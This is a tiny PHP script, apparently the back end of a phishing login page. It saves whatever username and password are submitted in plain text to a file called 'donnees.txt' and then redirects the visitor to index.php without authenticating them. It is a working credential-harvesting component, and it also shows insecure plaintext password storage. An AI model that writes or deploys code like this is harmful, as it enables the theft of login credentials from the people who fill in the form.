<?php

$content = $_POST['login'] . ',' . $_POST['password'];
file_put_contents('donnees.txt', $content);

header('Location: index.php');

?>